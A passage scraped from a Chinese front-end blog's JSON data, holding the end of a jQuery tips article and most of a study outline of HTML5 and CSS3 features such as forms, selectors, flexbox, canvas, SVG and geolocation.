123var iFrameDOM = $(\"iframe#someID\").contents();//然后，就可以通过find方法来遍历获取iFrame中的元素了iFrameDOM.find(\".message\").slideUp(); 管理搜索框的值 现在各大网站都有搜索框，而搜索框通常都有默认值，当输入框获取焦点时，默认值消失。而一旦输入框失去焦点，而输入框里又没有输入新的值，输入框里的值又会恢复成默认值，如果往输入框里输入了新值，则输入框的值为新输入的值。这种特效用JQuery很容易实现 1234567$(\"#searchbox\") .focus(function()&#123; $(this).val('')&#125;) .blur(function()&#123; var $this = $(this); // '请搜索...'为搜索框默认值 ($this.val() === '')? $this.val('请搜索...') : null; &#125;); 部分页面加载更新 为了提高web性能，有更新时我们通常不会加载整个页面，而只是仅仅更新部分页面内容，如图片的延迟加载等。页面部分刷新的特效在JQuery中也很容易实现 1234setInterval(function() &#123; //每隔5秒钟刷新页面内容 //获取的内容将增加到 id为content的元素后 $(\"#content\").load(url); &#125;, 5000); 采配置JQuery与其它库的兼容性 如果在项目中使用JQuery，$ 是最常用的变量名，但JQuery并不是唯一一个使用$作为变量名的库，为了避免命名冲突，你可以按照下面方式来组织你的代码 12345678//方法一： 为JQuery重新命名为 $jvar $j = jQuery.noConflict();$j('#id').... //方法二： 推荐使用的方式(function($)&#123; $(document).ready(function()&#123; //这儿，你可以正常的使用JQuery语法 &#125;);&#125;)(jQuery); 测试密码的强度 在某些网站注册时常常会要求设置密码，网站也会根据输入密码的字符特点给出相应的提示，如密码过短、强度差、强度中等、强度强等。这又是怎么实现的呢？看下面代码： 1&lt;input type=\"password\" name=\"pass\" id=\"pass\" /&gt; &lt;span id=\"passstrength\"&gt;&lt;/span&gt; 1234567891011121314151617181920212223242526//下面的正则表达式建议各位收藏哦，项目上有可能会用得着$('#pass').keyup(function(e) &#123; //密码为八位及以上并且字母数字特殊字符三项都包括 var strongRegex = new RegExp(\"^(?=.&#123;8,&#125;)(?=.*[A-Z])(?=.*[a-z])(?=.*[0-9])(?=.*\\\\W).*$\", \"g\"); //密码为七位及以上并且字母、数字、特殊字符三项中有两项，强度是中等 var mediumRegex = new RegExp(\"^(?=.&#123;7,&#125;)(((?=.*[A-Z])(?=.*[a-z]))|((?=.*[A-Z])(?=.*[0-9]))|((?=.*[a-z])(?=.*[0-9]))).*$\", \"g\"); var enoughRegex = new RegExp(\"(?=.&#123;6,&#125;).*\", \"g\"); if (false == enoughRegex.test($(this).val())) &#123; $('#passstrength').html('More Characters'); &#125; else if (strongRegex.test($(this).val())) &#123; $('#passstrength').className = 'ok'; $('#passstrength').html('Strong!'); &#125; else if (mediumRegex.test($(this).val())) &#123; $('#passstrength').className = 'alert'; $('#passstrength').html('Medium!'); &#125; else &#123; $('#passstrength').className = 'error'; $('#passstrength').html('Weak!'); &#125; return true;&#125;); 附录四 常见CND加速服务 Bootstrap中文网开源项目免费 CDN 服务 百度静态资源公共库 360网站卫士常用前端公共库CDN服务–已停止服务 开放静态文件 CDN 微软CDN服务 阿里云 百度开放云平台 jQuery CDN jQuery cdn加速 新浪CDN 附录五 jQuery的一些资源 速查手册 jQuery API 中文文档–css88 jQuery-overapi 在线桌面版API 更多详情—一份实用的API参考手册集合 jQuery插件 基础常用 滚动固定在某个位置 jQuery图片滚动插件全能版 jQuery Wookmark Load 瀑布流布局 jQuery Jcrop 图像裁剪 jQuery kxbdMarquee 无缝滚动 jQuery lightBox 灯箱效果 Lazy Load Plugin for jQuery 更多插件-动效库整理 插件动效库 常用组件 扩展阅读 jQuery源码分析系列 参考 锋利的jQuery 本文md源文件","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"jQuery","slug":"jQuery","permalink":"https://ru23.com/tags/jQuery/"}]},{"title":"HTML5+CSS3整体回顾","slug":"2016-10-HTML5-CSS3基础回顾","date":"2016-10-19T01:35:08.000Z","updated":"2018-10-24T03:46:01.926Z","comments":true,"path":"note/d1c7e878.html","link":"","permalink":"https://ru23.com/note/d1c7e878.html","excerpt":"转载请声明 原文链接 这篇文章主要总结H5的一些新增的功能以及一些基础归纳，这里只是一个提纲，并不是很详细，后面会一直完善补充新的内容，本文是一些笔记记录，放在这里供自己参考也供他人学习！","text":"转载请声明 原文链接 这篇文章主要总结H5的一些新增的功能以及一些基础归纳，这里只是一个提纲，并不是很详细，后面会一直完善补充新的内容，本文是一些笔记记录，放在这里供自己参考也供他人学习！ HTML5概览 第一课 HTML5结构 HTML5 是新一代的 HTML DTD声明改变 &lt;!DOCTYPE html&gt; 新的结构标签 常用的一些新的结构标签 结构标签 多媒体交互标签 特殊样式标签 兼容性不是很好的标签 补充说明 small 这个元素表示边栏评论，如附属细则 cite这个元素可用于显示作品标题（图书、电影、诗歌等） adress这个元素显示article或整个文档的合同信息，且位于footer这个元素之中 time显示人和机器可读的日期和时间，而且机器可读的时间戳是属性datetime的值第二个可选的是pubtime用于表示出版日期值 删除的HTML标签 纯表现的元素： basefont big center font s strike tt u 对可用性产生负面影响的元素： frame frameset noframes 产生混淆的元素： acronym applet isindex dir 重新定义的HTML标签 &lt;b&gt; 代表内联文本，通常是粗体，没有传递表示重要的意思 &lt;i&gt; 代表内联文本，通常是斜体，没有传递表示重要的意思 &lt;dd&gt; 可以同details与figure一同使用，定义包含文本，ialog也可用 &lt;dt&gt; 可以同details与figure一同使用，汇总细节，dialog也可用 &lt;hr&gt;表示主题结束，而不是水平线，虽然显示相同 &lt;menu&gt; 重新定义用户界面的菜单，配合commond或者menuitem使用 &lt;small&gt; 表示小字体，例如打印注释或者法律条款 &lt;strong&gt; 表示重要性而不是强调符号 崭新新的页面布局 传统的布局 HTML5标签布局 实例-from-dunitian 草图--from-dunitian 第二课 HTML5智能表单 HTML4.01 form表单复习 input表单type属性值 type=&quot;text&quot; 单行文本输入框 type=&quot;password&quot; 密码（maxlength=&quot;&quot;） type=&quot;radio&quot; 单项选择（checked=&quot;checked&quot;） type=&quot;checkbox&quot; 多项选择 type=&quot;button&quot; 按钮 type=&quot;submit&quot; 提交 type=&quot;file&quot; 上传文件 type=&quot;reset&quot; 重置 HTML5智能表单 input表单type属性值： type = &quot;email&quot; 限制用户输入必须为Email类型 type=&quot;url&quot; 限制用户输入必须为URL类型 type=&quot;date&quot; 限制用户输入必须为日期类型 type=&quot;datetime&quot; 显示完整日期 含时区 type=&quot;datetime-local&quot; 显示完整日期 不含时区 type=&quot;time&quot; 限制用户输入必须为时间类型 type=&quot;month&quot; 限制用户输入必须为月类型 type=&quot;week&quot; 限制用户输入必须为周类型 type=&quot;number&quot; 限制用户输入必须为数字类型 type=&quot;range&quot; 生成一个滑动条 type=&quot;search&quot; 具有搜索意义的表单results=&quot;n&quot;属性 type=&quot;color&quot; 生成一个颜色选择表单 type=&quot;tel&quot; 显示电话号码 Input 类型 - Date Pickers（日期选择器） **HTML5 拥有多个可供选取日期和时间的新输入类型： date 选取日、月、年 month 选取月、年 week 选取周和年 time 选取时间（小时和分钟） 以下两个没有作用 datetime 选取时间、日、月、年（UTC 时间） datetime-local 选取时间、日、月、年（本地时间） HTML5新增表单属性 required: required内容不能为空 placeholder: 表单提示信息 autofocus:自动聚焦 pattern: 正则表达式 输入的内容必须匹配到指定正则范围 autocomplete:是否保存用户输入值 默认为on，关闭提示选择off formaction: 在submit里定义提交地址 datalist: 输入框选择列表配合list使用 list值为datalist的id值 output: 计算或脚本输出 表单验证 validity对象，通过下面的valid可以查看验证是否通过，如果八种验证都返回true,一种验证失败返回false oText.addEventListener(&quot;invalid&quot;,fn1,false) ev.preventDefault(): 阻止默认事件 valueMissing: 当输入值为空的时候，返回true typeMismatch: 控件值与预期不吻合，返回true patternMismatch: 输入值不满足pattern正则，返回true cusomError setCustomValidity() 第三课 css3选择器 css3属性快速一览 css3属性快速一览 CSS3发展史简介 HTML的诞生 20世纪90年代初 1996年底， CSS第一版诞生 1998年5月 CSS2正式发布 2004年 CSS2.1发布 CSS3的发布 2002 2003 2004 2005 2007 2009 2010 模块化开发 CSS1 中定义了网页的基本属性： 字体、颜色、基本选择器等 CSS2中在CSS1的基础上添加了高级功能 浮动和定位、高级选择器等(子选择器、相邻选择器、通用选择器) CSS3遵循的是模块化开发。发布时间并不是一个时间点，而是一个时间段 CSS选择器复习 通用选择器：* 选择到所有的元素 选择子元素：&gt; 选择到元素的直接后代 相邻兄弟选择器：+选择到紧随目标元素后的第一个元素 普通兄弟选择器：~选择到紧随其后的所有兄弟元素 伪元素选择器： ::first-line 匹配文本块的首行 ::first-letter 选择文本块的首字母 伪类选择器： :before,:after在元素内容前面、后面添加内容(相当于行内元素) CSS3结构选择器 CSS3结构选择器 Css3 属性选择器 CSS3伪类选择器 UI伪类选择器： :enabled选择启用状态元素 :disabled 选择禁用状态元素 :checked选择被选中的input元素（单选按钮或复选框） :default 选择默认元素 :valid、invalid 根据输入验证选择有效或无效的input元素 :in-range、out-of-range选择指定范围之内或者之外受限的元素 :required、optional根据是否允许:required属性选择input元素 动态伪类选择器： :link选择链接元素 :visited 选择用户以访问的元素 :hover 鼠标悬停其上的元素 :active鼠标点击时触发的事件 :focus 当前获取焦点的元素 其他伪类选择器： :not(&lt;选择器&gt;)对括号内选择器的选择取反 :lang(&lt;目标语言&gt;) 基于lang全局属性的元素 :target url片段标识符指向的元素 :empty选择内容为空的元素 :selection鼠标光标选择元素内容 第四课 CSS3新增文本属性 CSS文本属性复习 white-space：对象内空格的处理方式 nowrap 控制文本不换行 pre 空白会被浏览器保留 pre-line 合并空白 保留换行符 pre-wrap 保留空白 正常换行 direction：文本流的方向 ltr 文本从左向右 rtl 文本从右往左 unicode-bidi：用于同一个页面里存在从不同方向读进的文本显示。与direction属性一起使用 CSS3新增文本属性 color:rgba(); text-overflow:是否使用一个省略标记（…）标示对象内文本的溢出 text-align:文本的对齐方式 text-transform:文字的大小写 text-decoration:文本的装饰线，复合属性 text-shadow:文本阴影 text-fill-color:文字填充颜色 text-stroke:复合属性。设置文字的描边 tab-size:制表符的长度 word-wrap:当前行超过指定容器的边界时是否断开转行 word-break:规定自动换行的处理方法 text-overflow:是否使用一个省略标记（...）标示对象内文本的溢出 clip： 默认值 无省略号 ellipsis：当对象内文本溢出时显示省略标记（...）。 注意：该属性需配合over-flow:hidden属性(超出处理)还有 white-space:nowrap(禁止换行)配合使用，否则无法看到效果 text-align:文本的对齐方式 css1 left:默认值 左对齐 right:右对齐 center:居中 justify： 内容两端对齐。 css3 start:开始边界对齐 end:结束边界对齐 text-transform:文字的大小写 css1 none： 默认值 无转换 capitalize： 将每个单词的第一个字母转换成大写 uppercase： 转换成大写 lowercase： 转换成小写 css3 full-width： 将左右字符设为全角形式。不支持 full-size-kana：将所有小假名字符转换为普通假名。不支持 例如：土耳其语 text-decoration:文本的装饰线，复合属性(只火狐支持) text-decoration-line： 指定文本装饰的种类。相当于CSS1时的text-decoration属性 text-decoration-style ： `指定文本装饰的样式。 text-decoration-color： `指定文本装饰的颜色。 blink： 指定文字的装饰是闪烁。 opera和firefox text-decoration : #F00 double overline CSS3实例 text-shadow:文本阴影 取值：x y blur color,…… x 横向偏移 y 纵向偏移 blur 模糊距离(灰度) color 阴影颜色 text-fill-color:文字填充颜色 text-stroke:复合属性。设置文字的描边 text-stroke-width:文字的描边厚度 text-stroke-color:文字的描边颜色 tab-size:制表符的长度 默认值为8(一个tab键的空格字节长度)，在 pre标签之内才会有显示 word-wrap:当前行超过指定容器的边界时是否断开转行 normal： 默认值 允许内容顶开或溢出指定的容器边界。 break-word： 内容将在边界内换行。如果需要，单词内部允许断行 第五课 CSS3盒模型 CSS盒模型复习 标准盒子模型 IE盒子模型 CSS3弹性盒模型 以下6个属性设置在容器上 flex-direction flex-wrap flex-flow justify-content align-items align-content 属性详解 flex-direction: row | row-reverse | column | column-reverse; flex-wrap: nowrap | wrap | wrap-reverse; flex-flow属性是flex-direction属性和flex-wrap属性的简写形式，默认值为row nowrap flex-flow: &lt;flex-direction&gt; || &lt;flex-wrap&gt;; justify-content属性定义了项目在主轴上的对齐方式。 justify-content: flex-start | flex-end | center | space-between | space-around; align-items属性定义项目在交叉轴上如何对齐。 align-items: flex-start | flex-end | center | baseline | stretch; align-content属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。 align-content: flex-start | flex-end | center | space-between | space-around | stretch; 以下6个属性设置在项目上 order flex-grow flex-shrink flex-basis flex align-self 属性详解 order属性定义项目的排列顺序。数值越小，排列越靠前，默认为0 flex-grow属性定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大。 flex-shrink属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小。 flex-basis属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。 flex属性是flex-grow, flex-shrink 和 flex-basis的简写，默认值为0 1 auto。后两个属性可选。 align-self属性允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性。默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch。 align-self: auto | flex-start | flex-end | center | baseline | stretch; 拓展阅读 flex布局语法篇 flex布局实例篇 第六课 css3新增背景属性 CSS背景属性复习 background: background-color:背景颜色 background-image:背景图片 background-repeat:背景重复 background-position:背景定位 background-attachment:背景固定(scroll/fixed) CSS3新增背景属性 background-size 背景尺寸 background-size:x y 水平 垂直方向的尺寸，像素/百分比/auto/… background-size:100% 100% background-size:cover 比例放大 background-size:contain 包含（图片不溢出） 多背景 background-image:url(1.jpg),url(2.jpg); background-origin 背景区域定位 border-box： 从border区域开始显示背景。 padding-box： 从padding区域开始显示背景。 content-box： 从content内容区域开始显示背 background-clip 背景绘制区域 border-box： 从border区域向外裁剪背景。 padding-box： 从padding区域向外裁剪背景。 content-box： 从content区域向外裁剪背景。 text:背景填充文本 no-clip： 从border区域向外裁剪背景 颜色渐变 线性渐变：linear-gradient(起点/角度，颜色 位置，…,) 起点：left/top/right/bottom/left top......默认top 角度：逆时针方向 0-360度 颜色 位置：red 50%, blue 100%(红色从50%渐变到100%为蓝色) repeating-linear-gradient 线性渐变重复平铺 IE低版本渐变(滤镜)： filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=&#39;#ffffff&#39;,endColorstr=&#39;#ff0000&#39;,GradientType=&#39;1&#39;); 径向渐变：radial-gradient(起点(圆心位置), 形状/半径/大小，颜色1，颜色2) 起点：left/top/right/bottom或具体值/百分比 形状：ellipse(椭圆)、circle(正圆) 大小：具体数值或百分比，也可以是关键字（closest-side(最近端), closest-corner最近角), farthest-side(最远端), farthest-corner(最远角), contain(包含) ,cover(覆盖)）; 第七课 css3新增颜色属性 CSS颜色属性复习 color name 颜色英文名称命名 HEX方式 十六进制方式 rgb方式 三原色配色方式 CSS3新增颜色属性 rgba() 名称 颜色 颜色 取值 r red 红色 0-255 g green 绿色 0-255 b blue 蓝色 0-255 a alpha 透明 0-1 HSL模式 HSLA模式 H： Hue(色调)。 0(或360)表示红色，120表示绿色，240表示蓝色，也可取其他数值来指定颜色。取值为：0 - 360 S：Saturation(饱和度)。取值为：0.0% - 100.0% L： Lightness(亮度)。取值为：0.0% - 100.0% A: alpha 透明度 0~1之间 语法:HSLA(H,S,L,A) HSL色轮 透明颜色：transparent 实例：border实现三角箭头、风车等 透明度： opacity 取值：0-1之间 注：低版本的IE浏览器不兼容,需用IE浏览器的滤镜实现相同效果，filter:alpha(opacity=50) 对于低版本的火狐浏览器需添加内核前缀，-moz-opacity 第八课 CSS3边框系列 圆角-阴影 边框圆角 在CSS2中添加圆角矩形需要技巧。我们必须为每个圆角使用不同的图片 在 CSS3中，创建圆角是非常容易的 在CSS3中，border-radius属性用于创建圆角 border-radius边框圆角写法 border-radius: 2em 1em 4em / 0.5em 3em; 等价于1234border-top-left-radius: 2em 0.5em;border-top-right-radius: 1em 3em;border-bottom-right-radius: 4em 0.5em;border-bottom-left-radius: 1em 3em; box-shadow方框添加阴影 语法：box-shadow:x-shadow y-shadow blur spread color inset; box-shadow的API x-shadow 必需。水平阴影的位置。允许负值。 y-shadow 必需。垂直阴影的位置。允许负值。 blur 可选。模糊距离。 spread 可选。阴影的尺寸。 color 可选。阴影的颜色。请参阅 CSS颜色值 inset 可选。将外部阴影 (outset) 改为内部阴影 实例：box-shadow:10px 10px 5px 5px #888888; 边框系列-图片 border-image语法 属性 版本 简介 border-image CSS3 设置或检索对象的边框使用图像来填充 border-image-source CSS3 设置或检索对象的边框是否用图像定义样式或图像来源路径 border-image-slice CSS3 设置或检索对象的边框背景图的分割方式 border-image-width CSS3 设置或检索对象的边框厚度 border-image-outset CSS3 设置或检索对象的边框背景图的扩展 border-image-repeat CSS3 设置或检索对象的边框图像的平铺方式 border-image-slice 设置或检索对象的边框背景图的分割方式 border-image-repeat 用于指定边框背景图的重复方式 取值： stretch： 指定用拉伸方式来填充边框背景图。 *默认的 repeat： 指定用平铺方式来填充边框背景图。当图片碰到边界时，如果超过则被截断。 round： 指定用平铺方式来填充边框背景图。图片会根据边框的尺寸动态调整图片的大小 直至正好可以铺满整个边框。写本文档时仅Firefox能看到该效果 第九课 CSS3运动体系 过渡 过渡：给改变添加过程 什么是过渡 过渡效果由哪几部分组成 过渡可以干些什么 transition 过渡属性 transition: property duration timing-function delay; transition-property:过渡属性的名称 none 没有过渡属性 all 所有属性都过渡(默认值) property 具体属性名称(property1,property2…) transition-duration:过渡属性花费的时间 time 秒或毫秒 transition-timing-function:过渡效果速度曲线 time 秒或毫秒 transition-delay:过渡效果延迟时间 transition-timing-function:过渡效果速度曲线 linear:规定以相同速度开始至结束的过渡效果（等于 cubic-bezier(0,0,1,1)）。 ease:规定慢速开始，然后变快，然后慢速结束的过渡效果（cubic-bezier(0.25,0.1,0.25,1)）。 ease-in:规定以慢速开始的过渡效果（等于 cubic-bezier(0.42,0,1,1)）。 ease-out :规定以慢速结束的过渡效果（等于 cubic-bezier(0,0,0.58,1)）。 ease-in-out :规定以慢速开始和结束的过渡效果（等于 cubic-bezier(0.42,0,0.58,1)）。 cubic-bezier(n,n,n,n):在 cubic-bezier 函数中定义自己的值。可能的值是 0至 1 之间的数值。 过渡完成事件 Webkit内核： 1obj.addEventListener('webkitTransitionEnd',function()&#123;&#125;) 标准: 1obj.addEventListener('transitionend',function()&#123;&#125;) 动画 什么是CSS3 动画？ 通过 CSS3，我们能够创建动画，这可以在许多网页中取代动画图片、Flash 动画以及 JavaScript 动画接口 属性 描述 @keyframes 规定动画。 animation 所有动画属性的简写属性，除了 animation-play-state 属性。 animation-name 规定 @keyframes 动画的名称。 animation-duration 规定动画完成一个周期所花费的秒或毫秒。 animation-timing-function 规定动画的速度曲线。 animation-delay 规定动画何时开始。 animation-iteration-count 规定动画被播放的次数。 animation-direction 规定动画是否在下一周期逆向地播放。 animation-play-state 规定动画是否正在运行或暂停。 animation-fill-mode 规定对象动画时间之外的状态。 animation-timing-function速度曲线 值 描述 linear 动画从头到尾的速度是相同的。 ease 默认。动画以低速开始，然后加快，在结束前变慢。 ease-in 动画以低速开始。 ease-out 动画以低速结束。 ease-in-out 动画以低速开始和结束。 cubic-bezier(n,n,n,n) 在 cubic-bezier 函数中自己的值。可能的值是从 0 到 1 的数值。 在谷歌浏览器里面需要加上-webkit-IE6,7,8,9不支持css3运动 拓展阅读 CSS3动画简介 CSS3盒模型阴影 box-shadow:inset x y blur spread color inset：投影方式 inset：内投影 outset：外投影 默认(不能设置) x、y：阴影偏移 blur：模糊半径（灰度） spread：扩展阴影半径 先扩展原有形状，再开始画阴影 color CSS3盒模型倒影 box-reflect 倒影 方向 above|below|left|right; 距离 渐变（可选） CSS3其他盒模型 box-sizing 盒模型解析模式 content-box 标准盒模型(和css2一样的计算) width/height=border+padding+content border-box 怪异盒模型width/height与设置的值一样 ，content减小 扩展阅读 学会使用css3的box-sizing布局 第十课 transform 2D转换 Css3平面转换方法 translate() 移动 rotate() 旋转 scale() 缩放 skew() 翻转 matrix() 矩阵 transform: rotate() 旋转函数 (deg) deg 度数 skew(X,Y) 倾斜函数 (deg) skewX() skewY() scale(X,Y) 缩放函数 (正数、负数和小数) scaleX() scaleY() translate(X,Y) 位移函数(px) translateX() translateY() rotate() 旋转方法 用于旋转元素角度 例：rotate(30deg) 把元素顺时针旋转 30 度 translate()位置方法 用于移动元素位置 例：translate(50px,100px) 把元素从左侧移动 50 像素，从顶端移动 100 像素。 其实有些类似于我们的相对定位 scale()尺寸方法 方法用于改变元素尺寸 例：scale(2,4) 把宽度转换为原始尺寸的 2 倍，把高度转换为原始高度的 4 倍 skew() 翻转方法 通过 skew()方法，元素翻转给定的角度 例：transform: skew(30deg,20deg); 把元素围绕 X轴把元素翻转30 度，围绕 Y 轴翻转 20度 第十一课 transform 3D转换 Css3立体转换 transform-style（preserve-3d） 建立3D空间（指定元素的子元素展示的场景是在3D场景还是平面(投影)场景） Perspective 视角（指定观察者与z=0平面的距离，从而让元素及子元素看起来有3D透视位置效果值：集体的带单位数值） Perspective- origin 视角基点 值：取值类似于变换基准 transform-origin：坐标轴基点（变换基准） 值：具体的坐标值/百分比/(left/right/center/top/bottom)默认 center center transform 新增函数 rotateX() rotateY() rotateZ() translateZ() scaleZ() 第十二课 视频音频 视频音频格式的简单介绍 常见的视频格式 视频的组成部分：画面、音频、编码格式 视频编码：H.264、Theora、VP8(google开源) 常见的音频格式 视频编码：ACC、MP3、Vorbis HTML5支持的格式 HTML5能在完全脱离插件的情况下播放音视频,但是不是所有格式都支持。 支持的视频格式： Ogg=带有Theora视频编码+Vorbis音频编码的Ogg文件 MEPG4=带有H.264视频编码+AAC音频编码的MPEG4文件 WebM=带有VP8视频编码+Vorbis音频编码的WebM格式 Video的使用 单独用法 &lt;video src=&quot;文件地址&quot; controls=&quot;controls&quot;&gt;&lt;/video&gt; 带提示用法 123&lt; video src=\"文件地址\" controls=\"controls\"&gt; 您的浏览器暂不支持video标签。播放视频&lt;/ video &gt; 兼容用法 12345&lt; video controls=\"controls\" width=\"300\"&gt; &lt;source src=\"move.ogg\" type=\"video/ogg\" &gt; &lt;source src=\"move.mp4\" type=\"video/mp4\" &gt; 您的浏览器暂不支持video标签。播放视频&lt;/ video &gt; Video的常见属性 属性 值 描述 Autoplay Autoplay 视频就绪自动播放 controls controls 向用户显示播放控件 Width Pixels(像素) 设置播放器宽度 Height Pixels(像素) 设置播放器高度 Loop Loop 播放完是否继续播放该视频，循环播放 Preload load{auto,meta,none} 规定是否预加载视频。 Src url 视频url地址 Poster Imgurl 加载等待的画面图片 Autobuffer Autobuffer 设置为浏览器缓冲方式，不设置autoply才有效 Video的API方法 方法 属性 事件 play() currentSrc play pause() currentTime pause load() videoWidth progress canPlayType() videoHeight error 第十三课 canvas 标签 &lt;canvas&gt; 不支持canvas 的浏览器可以看到的内容 默认宽度300px，默认高度150px 注意：canvas宽高需要设置在标签中 否则绘制的东西可能出错 &lt;canvas&gt; 绘制环境 getContext(&quot;2d&quot;);目前支持2d的场景 123&lt;canvas width=\"\" height=\"\" id=\"\"&gt; 您的浏览器不支持canvas，请更换浏览器！&lt;/canvas&gt; 绘制矩形 rect(L,T,W,H):创建一个矩形 fillRect(L,T,W,H):绘制填充的矩形 clearRect(x,y,w,h) 清除矩形选区 strokeRect(L,T,W,H)绘制空心矩形(无填充) 默认一像素黑色边框 设置绘图样式 fillStyle:填充颜色(绘制canvas是有顺序的) lineWidth:触笔宽度(线宽) strokeStyle:触笔颜色 绘制路径 beginPath() :开始路径 closePath():结束路径 moveTo(x,y):将触笔移动到x,y点 lineTo(x,y):绘制到x,y点 stroke(): 触笔方法 画线 默认为黑色 fill():填充方法 rect(x,y,w,h):矩形路径 save():保存路径 restore():恢复路径 绘制曲线 arcTo(x1,y1,x2,y2,r) x1,y1 坐标一 x2,y2坐标二 r圆弧半斤 quadraticCurveTo(dx,dy,x1,y1) 贝塞尔曲线:dx,dy控制点 x1,y1结束坐标 bezierCurveTo(dx1,dy1,dx2,dy2,x1,y1) 贝塞尔曲线:dx1,dy1 控制点一 dx2,dy2控制点二 x1,y1结束坐标 绘制圆形 arc(x,y,半径,起始弧度,结束弧度,旋转方向) x，y起始位置 弧度与角度：弧度=角度值*Math.PI/180 旋转方向：顺时针（默认：false），逆时针（true） 绘制文本 strokeText(文本,x,y); 绘制空心文本 fillText(文本,x,y); 绘制实心文本 font = &quot;font-size font-family&quot;注:尺寸 字体缺一不可 textAlign = &quot;&quot;;文本左右对齐方式 start center end left right textBaseline文本上下对齐方式 alphabetic默认。文本基线是普通的字母基线。 top 文本基线是 em 方框的顶端。。 hanging 文本基线是悬挂基线。 middle 文本基线是em 方框的正中。 ideographic 文本基线是表意基线。 bottom 文本基线是 em 方框的底端。 measureText(文本).width; 文本实际宽度(只有宽度值) 图形边界样式 lineJoin: 边界连接点样式 miter(默认值),round(圆角),bevel(斜角) lineCap: 端点样式 butt(默认值),round(圆角),square(高度多出线宽一半) 绘制图片 图片预加载，获取图片文件 onload中调用 drawImage(img,x,y,w,h);绘制图片(图片,坐标x,坐标y,宽度,高度) 设置背景 createPattern(img,平铺方式) 平铺方式:repeat,repeat-x,repeat-y,no-repeat canvas变换 translate(x,y) 坐标基准点偏移 : 从起始点为基准，移动到当前位置 rotate(弧度): 旋转 弧度公式 = 角度*PI/180 scale(wb,hb)缩放比例(缩放canvas绘制的图片) 颜色渐变 线性渐变:createLinearGradient(x1,y1,x2,y2) x1,y1起始坐标点 x2,y2结束坐标点 径向渐变:createRadialGradient(x1,y1,r1,x2,y2,r2) x1,y1,r1内圆坐标及半径 x2,y2,r2外圆坐标及半径 addColorStop(位置,颜色) 位置:渐变点 0-1之间 可多个 阴影 shadowOffsetX,shadowOffsetY x轴、y轴偏移 shadowBlur 阴影模糊度 shadowColor 阴影颜色 默认颜色:rgba(0,0,0,0) 像素 createImageData(sx,sy) 创建新的、空白的 ImageData 对象 getImageData(x1,y1,sx,sy) 返回ImageData对象，该对象为画布上指定的矩形复制像素数据putImageData(img,x2,y2) 把图像数据（从指定的 ImageData 对象）放回画布上 合成 globalAlpha 设置或返回绘图的当前alpha或透明值 globalCompositeOperation 设置或返回新图像如何绘制到已有的图像上 source-over默认。在目标图像上显示源图像。 source-atop在目标图像顶部显示源图像。源图像位于目标图像之外的部分是不可见的。 source-in 在目标图像中显示源图像。只有目标图像内的源图像部分会显示，目标图像是透明的。 source-out在目标图像之外显示源图像。只会显示目标图像之外源图像部分，目标图像是透明的。 destination-over在源图像上方显示目标图像。 destination-atop在源图像顶部显示目标图像。源图像之外的目标图像部分不会被显示。 destination-in在源图像中显示目标图像。只有源图像内的目标图像部分会被显示，源图像是透明的。 destination-out在源图像外显示目标图像。只有源图像外的目标图像部分会被显示，源图像是透明的。 lighter显示源图像 + 目标图像。 copy显示源图像。忽略目标图像。 xor使用异或操作对源图像与目标图像进行组合。 扩展阅读 canvas学习之API整理笔记（一） HTML5 API大盘点 第十四课 SVG绘图 svg是什么 矢量图 与canvas的区别 svg的引入方式 方式一： 12345&lt;?xml version=\"1.1\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"&gt;&lt;svg xmlns=\"http://www.w3.org/2000/svg\"&gt;&lt;/svg&gt; 方式二： 图片、背景、框架 方式三: html页面中添加svg circle:圆形 圆心坐标 cx,cy 半径 r fill stroke stroke-width stlye样式 fill = &quot;none/transparent&quot; ellipse:椭圆 cx属性定义的椭圆中心的x坐标 cy属性定义的椭圆中心的y坐标 rx属性定义的水平半径 ry属性定义的垂直半径 rect : 矩形 width height 宽高 坐标 x,y 圆角 rx,ry line:线条 x1,y1,x2,y2 stroke-opacity 透明 fill-opacity polyline:折线 points:点坐标（x1 y1 x2 y2...）或(x1,y1,x2,y2....) polygon:多边形 折线闭合 fill-rule:evenodd/nonzero; path: 路劲 d属性 M(起始坐标),L(结束坐标),H(水平线),V(垂直线),A(圆弧),Z(闭合路劲) C,S,Q,T 贝塞尔曲线 大写为绝对坐标(具体的坐标位置) 小写为相对坐标(相对起始坐标点的具体长度) A命令 x半径 y半径 角度 弧长(0 小弧 1大弧) 方向(0逆时针 1顺时针) 终点(x y) C命令：三次贝塞尔曲线 (x1,y1,x2,y2,x,y) x1,y1控制点一 x2,y2控制点二 x,y结束点 S命令：平滑贝塞尔曲线(自动对称一个控制点) (x2,y2,x,y) x2,y2控制点 x,y结束点 Q命令：二次贝塞尔曲线 (x1,y1,x,y) x1,y1控制点 x,y结束点 T命令：一次贝塞尔曲线 (x,y)结束点 g标签:组合元素 设置元素公共属性 共用属性 transform = &quot;translate(0,0)&quot; text标签 x, y, text-anchor(对齐start end middle) font-size image 标签 x, y, width height xlink:href(图片地址) 第十五课 地理信息与本地存储 地理位置 经度 : 南北极的连接线 纬度 : 东西连接的线 位置信息从何而来 IP地址 GPS全球定位系统 Wi-Fi无线网络 基站 avigator.geolocation 单次定位请求 ：getCurrentPosition(请求成功,请求失败,数据收集方式) 请求成功函数 经度 : coords.longitude 纬度 : coords.latitude 准确度 : coords.accuracy 海拔 : coords.altitude 海拔准确度 : coords.altitudeAcuracy 行进方向 : coords.heading 地面速度 : coords.speed 请求的时间: new Date(position.timestamp) 请求失败函数 失败编号 ：code 0 : 不包括其他错误编号中的错误 1 : 用户拒绝浏览器获取位置信息 2 : 尝试获取用户信息，但失败了 3 : 设置了timeout值，获取位置超时了 数据收集 : json的形式 enableHighAcuracy : 更精确的查找，默认false timeout : 获取位置允许最长时间，默认infinity maximumAge : 位置可以缓存的最大时间，默认0 多次定位请求* : watchPosition 移动设备有用，位置改变才会触发 配置参数：frequency 更新的频率 关闭更新请求 : 